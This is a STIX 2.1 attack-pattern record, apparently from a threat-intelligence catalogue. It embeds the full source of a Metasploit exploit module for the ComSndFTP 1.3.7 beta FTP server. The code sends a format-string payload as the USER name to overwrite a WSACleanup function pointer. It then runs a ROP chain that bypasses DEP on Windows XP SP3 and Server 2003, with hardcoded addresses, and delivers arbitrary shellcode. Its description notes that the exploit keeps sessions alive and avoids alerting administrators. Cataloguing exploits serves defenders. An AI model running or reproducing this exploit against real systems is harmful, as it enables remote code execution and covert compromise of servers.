{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b00776c0-d038-4c09-b9da-6c5416622c4a",
    "created": "2024-08-14T16:50:50.471854Z",
    "modified": "2024-08-14T16:50:50.471858Z",
    "name": "ComSndFTP v1.3.7 Beta USER Format String (Write4) Vulnerability",
    "description": " This module exploits the ComSndFTP FTP Server version 1.3.7 beta by sending a specially crafted format string specifier as a username. The crafted username is sent to the server to overwrite the hardcoded function pointer from Ws2_32.dll!WSACleanup. Once this function pointer is triggered, the code bypasses dep and then repairs the pointer to execute arbitrary code. The SEH exit function is preferred so that the administrators are not left with an unhandled exception message. When using the meterpreter payload, the process will never die, allowing for continuous exploitation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/comsnd_ftpd_fmtstr.rb",
            "external_id": "comsnd_ftpd_fmtstr.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'ComSndFTP v1.3.7 Beta USER Format String (Write4) Vulnerability',\n      'Description'   => %q{\n          This module exploits the ComSndFTP FTP Server version 1.3.7 beta by sending a specially\n        crafted format string specifier as a username. The crafted username is sent to the server to\n        overwrite the hardcoded function pointer from Ws2_32.dll!WSACleanup. Once this function pointer\n        is triggered, the code bypasses dep and then repairs the pointer to execute arbitrary code.\n        The SEH exit function is preferred so that the administrators are not left with an unhandled\n        exception message. When using the meterpreter payload, the process will never die, allowing\n        for continuous exploitation.\n      },\n      'Author'        =>\n        [\n          'ChaoYi Huang <ChaoYi.Huang[at]connect.polyu.hk>', # vuln discovery + poc\n          'rick2600 <rick2600[at]corelan.be>',               # msf module (target XP)\n          'mr_me <mr_me[at]corelan.be>',                     # msf module (target 23k)\n          'corelanc0d3r <peter.ve[at]corelan.be>'            # msf module\n        ],\n      'Arch'          => [ ARCH_X86 ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          # When a DoS is NOT a DoS\n          [ 'OSVDB', '82798'],\n          [ 'EDB', '19024']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh'\n        },\n      'Platform'      => ['win'],\n      'Privileged'    => false,\n      'Payload'       =>\n        {\n          'Space'            => 1000,\n          'BadChars'         => \"\\x00\\x0a\\x0d\",\n          'StackAdjustment'  => -3500,\n          'DisableNops'      => 'True'\n        },\n      'Targets'       =>\n        [\n          [\n            'Windows XP SP3 - English',\n            {\n              'Functionpointer'   => 0x71AC4050,  # winsock pointer\n              'Functionaddress'   => 0x71AB2636,  # the repair address\n              'Pivot'             => 0x00408D16,  # 0x004093AE-0x698 add esp, 72c ; retn\n              'Pad' => 568\n            }\n          ],\n          [\n            'Windows Server 2003 - English',\n            {\n              'Functionpointer'   => 0x71C14044,  # winsock pointer\n              'Functionaddress'   => 0x71C02661,  # the repair address\n              'Pivot'             => 0x00408D16,  # 0x004093AE-0x698 add esp, 72c ; retn\n              'Pad' => 568\n            }\n          ]\n        ],\n      'DisclosureDate' => '2012-06-08'))\n\n    register_options(\n      [\n        Opt::RPORT(21),\n      ])\n  end\n\n  def check\n    connect\n    banner = sock.get_once || \"\"\n    disconnect\n\n    validate  = \"\\x32\\x32\\x30\\x20\\xbb\\xb6\\xd3\\xad\\xb9\"\n    validate << \"\\xe2\\xc1\\xd9\\x46\\x54\\x50\\xb7\\xfe\\xce\"\n    validate << \"\\xf1\\xc6\\xf7\\x21\\x0d\\x0a\"\n\n    if banner.to_s == validate\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def exploit\n\n    rop = ''\n    if target.name =~ /Server 2003/\n      # C:\\WINDOWS\\system32\\msvcrt.dll v7.0.3790.3959\n      rop = [\n        0x77be3adb, # pop eax ; retn\n        0x77ba1114, # <- *&VirtualProtect()\n        0x77bbf244, # mov eax,[eax] ; pop ebp ; retn\n        junk,\n        0x77bb0c86, # xchg eax,esi ; retn\n        0x77be3adb, # pop eax ; retn\n        0xFFFFFBFF, # dwSize\n        0x77BAD64D, # neg eax ; pop ebp ; retn\n        junk,\n        0x77BBF102, # xchg eax,ebx ; add [eax],al ; retn\n        0x77bbfc02, # pop ecx ; retn\n        0x77bef001, # ptr that is w+\n        0x77bd8c04, # pop edi ; retn\n        0x77bd8c05, # retn\n        0x77be3adb, # pop eax ; retn\n        0xFFFFFFC0, # flNewProtect\n        0x77BAD64D, # neg eax ; pop ebp ; retn\n        0x77be2265, # ptr to 'push esp ; ret'\n        0x77BB8285, # xchg eax,edx ; retn\n        0x77be3adb, # pop eax ; retn\n        0x90909090, # nops\n        0x77be6591, # pushad ; add al,0ef ; retn\n      ].pack(\"V*\")\n\n    elsif target.name =~ /XP SP3/\n      # C:\\WINDOWS\\system32\\msvcrt.dll v7.0.2600.5512\n      rop = [\n        0x77C21D16, # pop eax ; retn\n        0x77C11120, # <- *&VirtualProtect()\n        0x77C2E493, # mov eax,[eax] ; pop ebp ; retn\n        junk,\n        0x77C21891, # pop esi ; retn\n        0x77C5D010, # ptr that is w+\n        0x77C2DD6C, # xchg eax,esi ; add [eax],al; retn\n        0x77C21D16, # pop eax ; retn\n        0xFFFFFBFF, # dwSize\n        0x77C1BE18, # neg eax ; pop ebp ; retn\n        junk,\n        0x77C2362C, # pop ebx ; retn\n        0x77C5D010, # ptr that is w+\n        0x77C2E071, # xchg eax,ebx ; add [eax],al ; retn\n        0x77C1F519, # pop ecx ; retn\n        0x77C5D010, # ptr that is w+\n        0x77C23B47, # pop edi ; retn\n        0x77C23B48, # retn\n        0x77C21D16, # pop eax ; retn\n        0xFFFFFFC0, # flNewProtect\n        0x77C1BE18, # neg eax ; pop ebp ; retn\n        0x77C35459, # ptr to 'push esp ; ret'\n        0x77C58FBC, # xchg eax,edx ; retn\n        0x77C21D16, # pop eax ; retn\n        0x90909090, # nops\n        0x77C567F0, # pushad ; add al,0ef ; retn\n      ].pack(\"V*\")\n    end\n\n    stage1 = %Q{\n      mov eax, #{target['Functionpointer']}\n      mov ecx, #{target['Functionaddress']}\n      mov [eax], ecx\n    }\n\n    offset_wp = rand_text_alphanumeric(1)\n    pivot     = target['Pivot']\n    offset    = target['Pad'] + rop.length + stage1.length + payload.encoded.length\n\n    attackstring  = rand_text_alphanumeric(7)\n    attackstring << [target['Functionpointer']].pack('V')\n    attackstring << \"%#{pivot}x\"                          # special pointer to our pivot\n    attackstring << \"%p\" * 208 + \"#{offset_wp }%n\"        # format specifiers to read and write the function pointer\n    attackstring << rand_text_alphanumeric(target['Pad'])\n    attackstring << rop\n    attackstring << Metasm::Shellcode.assemble(Metasm::Ia32.new, stage1).encode_string\n    attackstring << payload.encoded\n    attackstring << rand_text_alphanumeric(2000 - offset)\n    attackstring << \"\\r\\n\"\n\n    sploit = \"USER #{attackstring}\\r\\n\"\n\n    print_status(\"Triggering overflow...\")\n    connect\n    sock.get_once(1024)\n    sock.put(sploit)\n    select(nil, nil, nil, 2)\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-08",
    "x_mitre_platforms": [
        "['win']"
    ]
}